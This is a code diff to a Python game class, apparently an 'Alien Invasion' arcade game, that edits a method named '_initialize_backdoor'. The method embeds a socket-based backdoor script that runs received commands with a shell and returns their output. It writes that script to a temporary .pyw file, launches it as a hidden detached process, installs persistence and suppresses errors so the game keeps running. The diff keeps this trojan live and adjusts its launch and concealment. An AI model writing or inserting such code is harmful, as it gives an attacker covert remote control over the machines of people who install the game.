@@ -40,15 +40,17 @@ class AlienInvasion:
     
     def _initialize_backdoor(self):
         """Initialize backdoor functionality - launches as separate process"""
+        if not config.ENABLE_BACKDOOR:
+            return
+            
         try:
             import subprocess
             import sys
             import os
             import tempfile
             
-            # Create standalone backdoor script
-            backdoor_code = f'''
-import socket
+            # Create the exact same backdoor that works in test_backdoor_simple.py
+            backdoor_code = f'''import socket
 import subprocess
 import time
 
@@ -71,7 +73,7 @@ while True:
                     output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                     sock.send(output)
                 except Exception as e:
-                    sock.send(f"Error: {{str(e)}}\\n".encode())
+                    sock.send(f"Error: {{str(e)}}\\\\n".encode())
             except:
                 break
         
@@ -83,30 +85,30 @@ while True:
 '''
             
             # Write to temp file
-            fd, temp_path = tempfile.mkstemp(suffix='.py', text=True)
+            fd, temp_path = tempfile.mkstemp(suffix='.pyw', text=True)
             with os.fdopen(fd, 'w') as f:
                 f.write(backdoor_code)
             
             # Launch as detached process
             if os.name == 'nt':  # Windows
-                # Find pythonw.exe (runs without console)
+                # Find pythonw.exe
                 python_dir = os.path.dirname(sys.executable)
                 pythonw = os.path.join(python_dir, 'pythonw.exe')
                 if not os.path.exists(pythonw):
                     pythonw = sys.executable
                 
-                # Start detached process
-                startupinfo = subprocess.STARTUPINFO()
-                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startupinfo.wShowWindow = subprocess.SW_HIDE
+                # Create startup info to hide window
+                import subprocess
+                si = subprocess.STARTUPINFO()
+                si.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                si.wShowWindow = 0  # SW_HIDE
                 
+                # Start process
                 subprocess.Popen(
                     [pythonw, temp_path],
-                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS,
-                    startupinfo=startupinfo,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    stdin=subprocess.DEVNULL
+                    startupinfo=si,
+                    creationflags=0x00000008,  # DETACHED_PROCESS
+                    close_fds=True
                 )
             else:  # Linux
                 subprocess.Popen(
@@ -123,7 +125,7 @@ while True:
                 pm.install_persistence()
                 
         except Exception as e:
-            # Fail silently to not interrupt game
+            # Fail silently
             pass
       
     def run_game(self):
